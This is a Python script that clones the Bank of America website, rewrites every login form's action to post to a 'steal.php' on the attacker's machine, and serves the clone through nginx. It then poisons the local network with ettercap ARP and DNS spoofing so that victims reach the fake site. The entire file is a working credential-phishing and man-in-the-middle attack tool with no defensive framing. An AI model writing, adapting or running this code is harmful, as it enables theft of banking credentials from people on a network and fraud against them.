import socket
import re
import os

SITE = "www.bankofamerica.com"

def nginx_config():
	path = "/etc/nginx/nginx.conf"
	with open(path, 'r') as file:
		text = file.readlines()
	location = 0
	for i in range(len(text)):
		if 'location /' in text[i].strip().lower() and '#' not in text[i]:
			location = i + 1
	broken_path = (text[location].split()[1][:-1]).split("/")
	text[location] = text[location].replace(broken_path[len(broken_path)-2], SITE)
	with open(path, 'w') as file:
		file.writelines(text)
	return 0

def ip_addr():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	addr = s.getsockname()[0]
	s.close
	return addr

def ettercap_dns():
	path = "/etc/ettercap/etter.dns"
	ip = ip_addr()
	text = [SITE[4:] + " A " + ip, "\n", "*" + SITE[3:] + " A " + ip, "\n", SITE + " PTR " + ip]
	with open(path, 'w') as file:
                file.writelines(text)
	return 0

def check_login_file(path):
	print("***CHECKING ", path, "***")
	with open(path, 'r', encoding='utf-8',errors='ignore') as file:
		text = file.readlines()
	for i in range(len(text)):
		upper_line = text[i].upper()
		if "FORM" in upper_line and "POST" in upper_line and "ACTION" in upper_line:
			split_line = re.split("[\"\']", text[i])
			for j in range(len(split_line)):
				if "ACTION" in split_line[j].upper():
					action = j + 1
			if action < len(split_line):
				text[i] = text[i].replace(split_line[action], "http://" + ip_addr() + "/steal.php")
			print(text[i])
	with open(path, 'w') as file:
		file.writelines(text)
	return 0

def parse_files(path):
	for file in os.listdir(path):
		if os.path.isdir(path + "/" + file):
			parse_files(path + "/" + file)
		elif file.endswith(".html"):
			check_login_file(path + "/" + file)
	return 0

def main():
	os.system("rm -r www.*")
	os.system("wget --level=2 --recursive --page-requisites --no-parent --convert-links --adjust-extension --no-clobber -e robots=off " + SITE)
	parse_files(SITE)
	nginx_config()
	os.system("systemctl restart nginx")
	ettercap_dns()
	os.system("ettercap -i eth0 -T -q -M arp -P dns_spoof /// ///")
	return 0

if __name__ == '__main__':
	main()
